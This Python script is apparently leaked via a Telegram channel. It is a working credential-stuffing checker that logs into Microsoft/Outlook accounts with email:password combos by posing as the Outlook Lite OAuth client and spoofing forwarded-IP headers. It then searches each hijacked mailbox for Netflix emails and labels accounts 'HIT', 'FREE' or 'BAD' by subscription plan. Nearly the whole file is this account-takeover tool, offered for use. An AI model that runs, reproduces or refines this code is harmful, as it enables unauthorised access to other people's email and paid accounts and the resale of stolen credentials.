# Leak by @SenseiNoir
# Channel: https://t.me/SenseiFall

import re
import uuid
import time
import random
import requests
from datetime import datetime, timezone

class NetflixChecker:
    def __init__(self):
        self.email_changed_msgs = [
            "Your email address has been changed", "Ihre E-Mail-Adresse wurde geändert",
            "Votre adresse e-mail a été modifiée", "Su dirección decorreo electrónico ha sido cambiada",
            "メールアドレスが変更されました", "Vaša e-mail adresa je promijenjena",
            "Ваш адрес электронной почты был изменен", "Il tuo indirizzo email è stato modificato",
            "Teie e-posti aadress on muudetud", "Correo electrónico cambiado",
            "Адрес электронной почты был изменен", "Η διεύθυνση email σας έχει αλλάξει",
            "ที่อยู่อีเมลของคุณถูกเปลี่ยนแล้ว", "تم تغيير عنوان بريدك الإلكتروني",
            "تم تغيير البريد الإلكتروني", "您的电子邮件地址已更改", "تم التغيير"
        ]
        self.sign_in_msgs = [
            "Netflix: Your sign-in code", "Netflix: Dein Anmeldecode",
            "Netflix: Votre code d'identification", "Netflix: Tu código de inicio de sesión",
            "Netflix: Il tuo codice di accesso", "Netflix: Seu código de acesso",
            "Netflix: رمز تسجيل الدخول الخاص بك", "Netflix: رمز تسجيل الدخول",
            "Netflix: Ваш код", "Netflix: Ваш код подтверждения",
            "Netflix: Kod do logowania", "Netflix: O seu código de início de sessão",
            "Netflix: Din påloggingskode", "Netflix: Din loginkode",
            "Netflix: كود تسجيل الدخول", "Netflix: サインインコード",
            "Netflix: 로그인 코드", "Netflix: 您的登录代码", "Netflix: 您的登錄代碼",
            "Netflix: รหัสเข้าสู่ระบบของคุณ", "Netflix: Twój kod logowania",
            "Netflix: Giriş kodunuz", "Netflix: Váš přihلاصي kód",
            "Netflix: Az Ön bejelentkezési kódja"
        ]
        self.welcome_msgs = [
            "Welcome to Netflix", "Willkommen bei Netflix", "Bienvenue sur Netflix",
            "Bienvenido a Netflix", "Netflixへようこそ", "Dobrodošli na Netflix",
            "Добро пожаловать в Netflix", "Benvenuto su Netflix", "Tere tulemast Netflixi",
            "Καλώς ήρθατε στο Netflix", "ยินดีต้อนรับสู่ Netflix",
            "مرحبًا بك في Netflix", "欢迎来到Netflix"
        ]
        self.welcome_back_msgs = [
            "Welcome back to Netflix", "Willkommen zurück bei Netflix",
            "Bon retour sur Netflix", "Bienvenido de nuevo a Netflix",
            "Netflixへようこそ", "Dobrodošli nazad na Netflix",
            "С возвращением в Netflix", "Bentornato su Netflix",
            "Tere tulemast tagasi Netflixi", "Καλώς ήρθατε ξανά στο Netflix",
            "ยินดีต้อนรับกลับสู่ Netflix", "مرحبًا بعودتك إلى Netflix",
            "欢迎回到Netflix"
        ]
        self.new_device_msgs = [
            "A new device is using your account", "Ein neues Gerät verwendet Ihr Konto",
            "Un nouvel appareil utilise votre compte", "Un nuevo dispositivo está usando su cuenta",
            "Un nuovo dispositivo sta usando il tuo account", "Um novo aparelho está usando sua conta",
            "جهاز جديد يستخدم حسابك", "Новое устройство использует вашу учетную запись",
            "Nowe urządzenie korzysta z Twojego konta", "En ny enhet bruker kontoen din",
            "En ny enhed bruger din konto", "新しいデバイスがアカウントを使用しています",
            "새 디바이스에서 회원님의 계정을 사용 중입니다", "有新设备正在使用您的帐户",
            "有新裝置正在使用您的帳戶", "มีอุปกรณ์ใหม่กำลังใช้งานบัญชีของคุณ",
            "Hesabınızı yeni bir cihaz kullanıyor", "Váš účet používá nové zařízení",
            "Egy új eszköz használja a fiókját", "Μια νέα συσκευή χρησιμοποιεί τον λογαριασμό σας"
        ]
        self.almost_there_msgs = [
            "You're almost there", "Sie sind fast am Ziel",
            "Vous y êtes presque", "¡Ya casi terminas",
            "¡Ya casi está", "Ci sei quasi", "Quase lá",
            "Você está quase lá", "لقد أوشكت على الانتهاء",
            "خطوة واحدة أخيرة", "あともう少しです", "Prawie gotowe",
            "Neredeyse bitti"
        ]
        self.timeout = 15

    def generate_user_agent(self):
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"

    def check_account(self, email, password):
        if "@" not in email or len(password) < 3:
            return {"status": "BAD", "email": email, "password": password, "reason": "Invalid format"}
        email, password = str(email), str(password)
        for attempts in range(3):
            try:
                session = requests.Session()
                ua = self.generate_user_agent()
                client_id = str(uuid.uuid4())
                correct_id = str(uuid.uuid4())
                auth_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                auth_headers = {"Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "User-Agent": ua, "client-request-id": client_id, "correlation-id": correct_id}
                auth_resp = session.get(auth_url, headers=auth_headers, allow_redirects=True, timeout=self.timeout)
                url_match = re.search(r'urlPost":"([^"]+)"', auth_resp.text)
                ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', auth_resp.text)
                if not url_match or not ppft_match:
                    continue
                url = url_match.group(1)
                ppft = ppft_match.group(1)
                kuki = session.cookies.get_dict()
                msprequ = kuki.get('MSPRequ')
                uaid = kuki.get('uaid')
                mspok = kuki.get('MSPOK')
                oparams = kuki.get('OParams')
                if not oparams or not mspok or not uaid or not msprequ:
                    continue
                ips = ".".join(str(random.randint(1, 300)) for _ in range(4))
                login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&hpgrequestid=&PPFT={ppft}"
                login_headers = {"User-Agent": ua, "Pragma": "no-cache", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Host": "login.live.com", "Connection": "keep-alive", "Content-Length": str(len(login_data)), "Content-Type": "application/x-www-form-urlencoded", "Referer": auth_resp.url, "Cookie": f"MSPRequ={msprequ}; uaid={uaid}; MSPOK={mspok}; OParams={oparams}", "x-forwarded": f"for={ips}; by={ips}", "x-forwarded-for": ips, "x-real-ip": ips, "client-ip": ips}
                login_resp = session.post(url, headers=login_headers, data=login_data, allow_redirects=False, timeout=self.timeout)
                if "OParams" not in login_resp.cookies.get_dict().keys():
                    continue
                code_cid = login_resp.headers["Location"].split('code=')[1].split('&')[0]
                if not code_cid:
                    return {"status": "BAD", "email": email, "password": password, "reason": "No auth code"}
                token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
                token_data = {"client_info": "1", "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D", "grant_type": "authorization_code", "code": code_cid, "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
                token_resp = session.post(token_url, headers={"Content-Type": "application/x-www-form-urlencoded"}, data=token_data, timeout=self.timeout)
                if token_resp.status_code != 200:
                    continue
                access_token = token_resp.json().get('access_token')
                if not access_token:
                    continue
                mailbox_id = str(uuid.uuid4())
                search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
                search_data = {"Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7", "Scenario": {"Name": "owa.react"}, "TimeZone": "United Kingdom Standard Time", "TextDecorations": "Off", "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]}, "From": 0, "Query": {"QueryString": "info@account.netflix.com"}, "RefiningQueries": None, "Size": 25, "Sort": [{"Field": "Time", "SortDirection": "Desc"}], "EnableTopResults": True, "TopResultsCount": 3}], "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"}
                search_headers = {"User-Agent": "Outlook-Android/2.0", "Pragma": "no-cache", "Accept": "application/json", "ForceSync": "false", "Authorization": f"Bearer {access_token}", "X-AnchorMailbox": "CID:" + mailbox_id, "Host": "substrate.office.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "Content-Type": "application/json"}
                search_resp = session.post(search_url, headers=search_headers, json=search_data, timeout=self.timeout)
                text_html = search_resp.text
                if "info@account.netflix.com" not in text_html:
                    return {"status": "BAD", "email": email, "password": password, "reason": "No Netflix emails found"}
                categories = {"email_changed": self.email_changed_msgs, "free": self.almost_there_msgs, "premium": self.sign_in_msgs + self.welcome_msgs + self.welcome_back_msgs + self.new_device_msgs}
                earliest_idx = len(text_html)
                best_category = None
                for category, msgs in categories.items():
                    for msg in msgs:
                        idx = text_html.find(msg)
                        if idx != -1 and idx < earliest_idx:
                            earliest_idx = idx
                            best_category = category
                plan_match = re.search(r'(Premium Ultra HD|Standard HD|Basic with Ads|Standard with Ads|Premium|Standard|Basic)', text_html, re.IGNORECASE)
                if best_category == "email_changed":
                    return {"status": "FREE", "email": email, "password": password, "reason": "Email changed", "data": [f"{email}:{password} | EMAIL_CHANGED"]}
                elif best_category == "free":
                    return {"status": "FREE", "email": email, "password": password, "reason": "No subscription", "data": [f"{email}:{password} | FREE"]}
                elif best_category == "premium":
                    plan = plan_match.group(1).title() if plan_match else "Unknown"
                    return {"status": "HIT", "email": email, "password": password, "netflix_plan": plan, "data": [f"{email}:{password} | PLAN: {plan}"]}
                else:
                    return {"status": "BAD", "email": email, "password": password, "reason": "Unknown response"}
            except Exception:
                time.sleep(0.5)
                continue
        return {"status": "ERROR", "email": email, "password": password, "reason": "Max retries exceeded"}

    def get_stats(self):
        return {"total_checked": 0, "total_hits": 0}